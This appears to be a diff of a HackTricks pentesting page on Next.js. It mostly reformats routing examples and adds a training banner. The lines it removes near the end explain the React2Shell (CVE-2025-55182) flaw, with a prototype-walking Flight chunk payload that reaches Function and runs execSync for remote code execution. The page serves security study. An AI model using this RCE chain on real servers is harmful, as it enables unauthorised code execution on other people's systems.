@@ -1,7 +1,34 @@
+[ ![]() ]()
+
 # NextJS
 
-{{#include ../../banners/hacktricks-training.md}}
-
+> Tip
+>
+> Learn & practice AWS
+> Hacking:![](../../../../../images/arte.png)[**HackTricks Training AWS Red
+> Team Expert
+> (ARTE)**](https://training.hacktricks.xyz/courses/arte)![](../../../../../images/arte.png)  
+>  Learn & practice GCP Hacking:
+> ![](../../../../../images/grte.png)[**HackTricks Training GCP Red Team
+> Expert
+> (GRTE)**](https://training.hacktricks.xyz/courses/grte)![](../../../../../images/grte.png)  
+>  Learn & practice Az Hacking:
+> ![](../../../../../images/azrte.png)[**HackTricks Training Azure Red Team
+> Expert
+> (AzRTE)**](https://training.hacktricks.xyz/courses/azrte)![](../../../../../images/azrte.png)
+>
+> Support HackTricks
+>
+>   * Check the [**subscription
+> plans**](https://github.com/sponsors/carlospolop)!
+>   * **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the
+> [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦
+> [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+>   * **Share hacking tricks by submitting PRs to the**
+> [**HackTricks**](https://github.com/carlospolop/hacktricks) and
+> [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
+> github repos.
+>
 
 ## General Architecture of a Next.js Application
 
@@ -11,62 +38,59 @@ A standard Next.js project follows a specific file and directory structure
 that facilitates its features like routing, API endpoints, and static asset
 management. Here’s a typical layout:
 
-<details>
-<summary>Example Next.js project structure</summary>
-
-```text
-my-nextjs-app/
-├── node_modules/
-├── public/
-│   ├── images/
-│   │   └── logo.png
-│   └── favicon.ico
-├── app/
-│   ├── api/
-│   │   └── hello/
-│   │       └── route.ts
-│   ├── layout.tsx
-│   ├── page.tsx
-│   ├── about/
-│   │   └── page.tsx
-│   ├── dashboard/
-│   │   ├── layout.tsx
-│   │   └── page.tsx
-│   ├── components/
-│   │   ├── Header.tsx
-│   │   └── Footer.tsx
-│   ├── styles/
-│   │   ├── globals.css
-│   │   └── Home.module.css
-│   └── utils/
-│       └── api.ts
-├── .env.local
-├── next.config.js
-├── tsconfig.json
-├── package.json
-├── README.md
-└── yarn.lock / package-lock.json
-```
-
-</details>
+    
+    
+    my-nextjs-app/
+    ├── node_modules/
+    ├── public/
+    │   ├── images/
+    │   │   └── logo.png
+    │   └── favicon.ico
+    ├── app/
+    │   ├── api/
+    │   │   └── hello/
+    │   │       └── route.ts
+    │   ├── layout.tsx
+    │   ├── page.tsx
+    │   ├── about/
+    │   │   └── page.tsx
+    │   ├── dashboard/
+    │   │   ├── layout.tsx
+    │   │   └── page.tsx
+    │   ├── components/
+    │   │   ├── Header.tsx
+    │   │   └── Footer.tsx
+    │   ├── styles/
+    │   │   ├── globals.css
+    │   │   └── Home.module.css
+    │   └── utils/
+    │       └── api.ts
+    ├── .env.local
+    ├── next.config.js
+    ├── tsconfig.json
+    ├── package.json
+    ├── README.md
+    └── yarn.lock / package-lock.json
+    
+    
 
 ### Core Directories and Files
 
-- **public/:** Hosts static assets such as images, fonts, and other files. Files here are accessible at the root path (`/`).
-- **app/:** Central directory for your application’s pages, layouts, components, and API routes. Embraces the **App Router** paradigm, enabling advanced routing features and server-client component segregation.
-- **app/layout.tsx:** Defines the root layout for your application, wrapping around all pages and providing consistent UI elements like headers, footers, and navigation bars.
-- **app/page.tsx:** Serves as the entry point for the root route `/`, rendering the home page.
-- **app/[route]/page.tsx:** Handles static and dynamic routes. Each folder within `app/` represents a route segment, and `page.tsx` within those folders corresponds to the route’s component.
-- **app/api/:** Contains API routes, allowing you to create serverless functions that handle HTTP requests. These routes replace the traditional `pages/api` directory.
-- **app/components/:** Houses reusable React components that can be utilized across different pages and layouts.
-- **app/styles/:** Contains global CSS files and CSS Modules for component-scoped styling.
-- **app/utils/:** Includes utility functions, helper modules, and other non-UI logic that can be shared across the application.
-- **.env.local:** Stores environment variables specific to the local development environment. These variables are **not** committed to version control.
-- **next.config.js:** Customizes Next.js behavior, including webpack configurations, environment variables, and security settings.
-- **tsconfig.json:** Configures TypeScript settings for the project, enabling type checking and other TypeScript features.
-- **package.json:** Manages project dependencies, scripts, and metadata.
-- **README.md:** Provides documentation and information about the project, including setup instructions, usage guidelines, and other relevant details.
-- **yarn.lock / package-lock.json:** Locks the project’s dependencies to specific versions, ensuring consistent installations across different environments.
+  * **public/:** Hosts static assets such as images, fonts, and other files. Files here are accessible at the root path (`/`).
+  * **app/:** Central directory for your application’s pages, layouts, components, and API routes. Embraces the **App Router** paradigm, enabling advanced routing features and server-client component segregation.
+  * **app/layout.tsx:** Defines the root layout for your application, wrapping around all pages and providing consistent UI elements like headers, footers, and navigation bars.
+  * **app/page.tsx:** Serves as the entry point for the root route `/`, rendering the home page.
+  * **app/[route]/page.tsx:** Handles static and dynamic routes. Each folder within `app/` represents a route segment, and `page.tsx` within those folders corresponds to the route’s component.
+  * **app/api/:** Contains API routes, allowing you to create serverless functions that handle HTTP requests. These routes replace the traditional `pages/api` directory.
+  * **app/components/:** Houses reusable React components that can be utilized across different pages and layouts.
+  * **app/styles/:** Contains global CSS files and CSS Modules for component-scoped styling.
+  * **app/utils/:** Includes utility functions, helper modules, and other non-UI logic that can be shared across the application.
+  * **.env.local:** Stores environment variables specific to the local development environment. These variables are **not** committed to version control.
+  * **next.config.js:** Customizes Next.js behavior, including webpack configurations, environment variables, and security settings.
+  * **tsconfig.json:** Configures TypeScript settings for the project, enabling type checking and other TypeScript features.
+  * **package.json:** Manages project dependencies, scripts, and metadata.
+  * **README.md:** Provides documentation and information about the project, including setup instructions, usage guidelines, and other relevant details.
+  * **yarn.lock / package-lock.json:** Locks the project’s dependencies to specific versions, ensuring consistent installations across different environments.
 
 ## Client-Side in Next.js
 
@@ -80,15 +104,16 @@ Handling the Root Path /
 
 **File Structure:**
 
-```text
-my-nextjs-app/
-├── app/
-│   ├── layout.tsx
-│   └── page.tsx
-├── public/
-├── next.config.js
-└── ...
-```
+    
+    
+    my-nextjs-app/
+    ├── app/
+    │   ├── layout.tsx
+    │   └── page.tsx
+    ├── public/
+    ├── next.config.js
+    └── ...
+    
 
 **Key Files:**
 
@@ -97,18 +122,19 @@ my-nextjs-app/
 
 **Implementation:**
 
-```tsx
-// app/page.tsx
-
-export default function HomePage() {
-  return (
-    <div>
-      <h1>Welcome to the Home Page!</h1>
-      <p>This is the root route.</p>
-    </div>
-  )
-}
-```
+    
+    
+    tsxCopy code// app/page.tsx
+    
+    export default function HomePage() {
+      return (
+        <div>
+          <h1>Welcome to the Home Page!</h1>
+          <p>This is the root route.</p>
+        </div>
+      );
+    }
+    
 
 **Explanation:**
 
@@ -122,32 +148,34 @@ Handling Other Static Paths
 
 **File Structure:**
 
-```text
-my-nextjs-app/
-├── app/
-│   ├── about/
-│   │   └── page.tsx
-│   ├── layout.tsx
-│   └── page.tsx
-├── public/
-├── next.config.js
-└── ...
-```
+    
+    
+    arduinoCopy codemy-nextjs-app/
+    ├── app/
+    │   ├── about/
+    │   │   └── page.tsx
+    │   ├── layout.tsx
+    │   └── page.tsx
+    ├── public/
+    ├── next.config.js
+    └── ...
+    
 
 **Implementation:**
 
-```tsx
-// app/about/page.tsx
-
-export default function AboutPage() {
-  return (
-    <div>
-      <h1>About Us</h1>
-      <p>Learn more about our mission and values.</p>
-    </div>
-  )
-}
-```
+    
+    
+    // app/about/page.tsx
+    
+    export default function AboutPage() {
+      return (
+        <div>
+          <h1>About Us</h1>
+          <p>Learn more about our mission and values.</p>
+        </div>
+      )
+    }
+    
 
 **Explanation:**
 
@@ -163,42 +191,44 @@ applications to display content based on parameters like IDs, slugs, etc.
 
 **File Structure:**
 
-```text
-my-nextjs-app/
-├── app/
-│   ├── posts/
-│   │   └── [id]/
-│   │       └── page.tsx
-│   ├── layout.tsx
-│   └── page.tsx
-├── public/
-├── next.config.js
-└── ...
-```
+    
+    
+    arduinoCopy codemy-nextjs-app/
+    ├── app/
+    │   ├── posts/
+    │   │   └── [id]/
+    │   │       └── page.tsx
+    │   ├── layout.tsx
+    │   └── page.tsx
+    ├── public/
+    ├── next.config.js
+    └── ...
+    
 
 **Implementation:**
 
-```tsx
-// app/posts/[id]/page.tsx
-
-import { useRouter } from "next/navigation"
-
-interface PostProps {
-  params: { id: string }
-}
-
-export default function PostPage({ params }: PostProps) {
-  const { id } = params
-  // Fetch post data based on 'id'
-
-  return (
-    <div>
-      <h1>Post #{id}</h1>
-      <p>This is the content of post {id}.</p>
-    </div>
-  )
-}
-```
+    
+    
+    tsxCopy code// app/posts/[id]/page.tsx
+    
+    import { useRouter } from 'next/navigation';
+    
+    interface PostProps {
+      params: { id: string };
+    }
+    
+    export default function PostPage({ params }: PostProps) {
+      const { id } = params;
+      // Fetch post data based on 'id'
+    
+      return (
+        <div>
+          <h1>Post #{id}</h1>
+          <p>This is the content of post {id}.</p>
+        </div>
+      );
+    }
+    
 
 **Explanation:**
 
@@ -215,35 +245,37 @@ that mirror the directory layout.
 
 **File Structure:**
 
-```text
-my-nextjs-app/
-├── app/
-│   ├── dashboard/
-│   │   ├── settings/
-│   │   │   └── profile/
-│   │   │       └── page.tsx
-│   │   └── page.tsx
-│   ├── layout.tsx
-│   └── page.tsx
-├── public/
-├── next.config.js
-└── ...
-```
+    
+    
+    arduinoCopy codemy-nextjs-app/
+    ├── app/
+    │   ├── dashboard/
+    │   │   ├── settings/
+    │   │   │   └── profile/
+    │   │   │       └── page.tsx
+    │   │   └── page.tsx
+    │   ├── layout.tsx
+    │   └── page.tsx
+    ├── public/
+    ├── next.config.js
+    └── ...
+    
 
 **Implementation:**
 
-```tsx
-// app/dashboard/settings/profile/page.tsx
-
-export default function ProfileSettingsPage() {
-  return (
-    <div>
-      <h1>Profile Settings</h1>
-      <p>Manage your profile information here.</p>
-    </div>
-  )
-}
-```
+    
+    
+    tsxCopy code// app/dashboard/settings/profile/page.tsx
+    
+    export default function ProfileSettingsPage() {
+      return (
+        <div>
+          <h1>Profile Settings</h1>
+          <p>Manage your profile information here.</p>
+        </div>
+      );
+    }
+    
 
 **Explanation:**
 
@@ -259,39 +291,41 @@ flexibility in route handling.
 
 **File Structure:**
 
-```text
-my-nextjs-app/
-├── app/
-│   ├── [...slug]/
-│   │   └── page.tsx
-│   ├── layout.tsx
-│   └── page.tsx
-├── public/
-├── next.config.js
-└── ...
-```
+    
+    
+    my-nextjs-app/
+    ├── app/
+    │   ├── [...slug]/
+    │   │   └── page.tsx
+    │   ├── layout.tsx
+    │   └── page.tsx
+    ├── public/
+    ├── next.config.js
+    └── ...
+    
 
 **Implementation:**
 
-```tsx
-// app/[...slug]/page.tsx
-
-interface CatchAllProps {
-  params: { slug: string[] }
-}
-
-export default function CatchAllPage({ params }: CatchAllProps) {
-  const { slug } = params
-  const fullPath = `/${slug.join("/")}`
-
-  return (
-    <div>
-      <h1>Catch-All Route</h1>
-      <p>You have navigated to: {fullPath}</p>
-    </div>
-  )
-}
-```
+    
+    
+    // app/[...slug]/page.tsx
+    
+    interface CatchAllProps {
+      params: { slug: string[] }
+    }
+    
+    export default function CatchAllPage({ params }: CatchAllProps) {
+      const { slug } = params
+      const fullPath = `/${slug.join("/")}`
+    
+      return (
+        <div>
+          <h1>Catch-All Route</h1>
+          <p>You have navigated to: {fullPath}</p>
+        </div>
+      )
+    }
+    
 
 **Explanation:**
 
@@ -1418,110 +1452,9 @@ web/deserialization/nodejs-proto-prototype-pollution/index.html)
       }
     }
     
-#### Flight chunk anatomy & entry point
-
-The [React2Shell deep dive](https://i0.rs/blog/a-deep-and-very-technical-analysis-of-cve-2025-55182-react2-shell/) shows that every RSC request is just a multipart body where **each part is a JSON-encoded Flight chunk** (JSX tree, module metadata, promises, etc.).
-
-<details>
-<summary>Example raw Flight request</summary>
-
-```http
-POST / HTTP/1.1
-Content-Type: multipart/form-data; boundary=060160836ce39005e491f6d3738e03a4
-
---060160836ce39005e491f6d3738e03a4
-
-"J:{\"type\":\"div\",\"props\":{\"children\":[{\"$\":\"1\",\"children\":[]}]}}"
---060160836ce39005e491f6d3738e03a4
-
-"{\"object1\":{\"key1\":\"value1\"}}"
---060160836ce39005e491f6d3738e03a4
-
-"\"$@3\""
---060160836ce39005e491f6d3738e03a4
-
-"[\"$1:object1:key1\"]"
---060160836ce39005e491f6d3738e03a4
-
-"M:[\"app/components/Button.jsx\",\"default\"]"
---060160836ce39005e491f6d3738e03a4--
-```
-</details>
-
-Once Next.js reassembles the upload, **React builds a chunk map** and starts dereferencing `$` paths:
-
-```python
-{
-    "1": '{"object1":{"key1":"value1"}}',
-    "2": '"$@3"',
-    "3": '["$1:object1:key1"]'
-}
-```
-
-`:$attribute` chains allow the attacker to climb arbitrary objects and even reach prototypes. Because Next’s `action-handler.ts` simply forwards these bodies into `react-server`, **no user middleware can sanitize them before `parseModelString` executes**.
-
-#### `parseModelString` dereference grammar
-
-`parseModelString()` interprets special `$` prefixes and materializes complex types with almost no schema validation:
-
-| Prefix | Type | Notes |
-| --- | --- | --- |
-| `$$` | Escaped string | Literal `$` in user data. |
-| `$@id` | Promise/chunk ref | Resolves to another chunk or deferred value. |
-| `$[hex]` | Chunk reference | Imports the chunk with that hex id. |
-| `$F` | Server reference | Server Action/function bridge. |
-| `$B` | `Blob` | Recreates binary payloads. |
-| `$Q` / `$W` / `$K` | `Map` / `Set` / `FormData` | Hydrates complex containers. |
-| `$D` | `Date` | Parses ISO timestamps. |
-| `$n` | `BigInt` | Creates `BigInt` values. |
-| `$u` / `$N` | `undefined` / `NaN` | Native JS primitives. |
-
-Internally each chunk walks through states such as `PENDING`, `BLOCKED`, `RESOLVED_MODEL`, `CYCLIC`, etc., so **any polluted property that gets touched during those transitions executes inside the Node.js process**.
-
-#### Prototype-walking to `Function()` and RCE
-
-Because references are just colon-delimited property accessors, it is trivial to **walk from benign JSON into prototypes**:
-
-```python
-chunks = {
-    "0": '"$1:__proto__:constructor:constructor"',
-    "1": '{"key":2}'
-}
-```
-
-`$1` resolves to the attacker-controlled object, `__proto__` climbs to `Object.prototype`, the first `constructor` yields `Object`, and the second `constructor` returns the global `Function` constructor. Once exposed, a single chunk can execute arbitrary JS:
-
-```javascript
-Function("return process")()
-  .mainModule.require('child_process')
-  .execSync('id')
-```
-
-The same grammar reaches `process.env`, `process.mainModule`, or any host API reachable through the prototype chain.
-
-#### Promise- and chunk-based gadget chains
-
-`$@id` promises and hex chunk references let the attacker **delay evaluation until a later chunk resolves**, creating multi-stage gadget chains. For example, sending chunk `"$@3"` keeps a value pending until chunk `3` arrives with `"$1:object1:key1"`, so resolution first pollutes chunk `1`, then dereferences `object1:key1`, and finally triggers whatever accessor was planted on that object. Combining these promises with `$Q`/`$W` maps/sets or `$B` blobs gives you numerous async execution points inside the Flight parser.
-
-#### Instrumenting local builds
-
-The blog demonstrates spinning up a **local Next.js app that symlinks to unpacked React builds** so you can break exactly where the vulnerable helpers run:
-
-```json
-"dependencies": {
-  "form-data": "^4.0.5",
-  "next": "16.0.6",
-  "react": "file:/path/react-19.2.0",
-  "react-dom": "file:/path/react-dom-19.2.0",
-  "scheduler": "file:/path/scheduler-0.28.0"
-}
-```
-
-Attach VSCode to the Node process, sprinkle `debugger;` inside a public PoC (e.g. @maple3142’s payload), and you can single-step through `parseModelString`, inspect `_chunks`, `_response` and promise states, and experiment with new `$` gadgets before redeploying them against real targets.
 
 ## References
 
-  * [A Deep And Very Technical Analysis of CVE-2025-55182 (React2Shell)](https://i0.rs/blog/a-deep-and-very-technical-analysis-of-cve-2025-55182-react2-shell/)
   * [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
   * [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
   * [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
@@ -1554,4 +1487,3 @@ Attach VSCode to the Node process, sprinkle `debugger;` inside a public PoC (e.g
 > github repos.
 >
 
-{{#include ../../banners/hacktricks-training.md}}
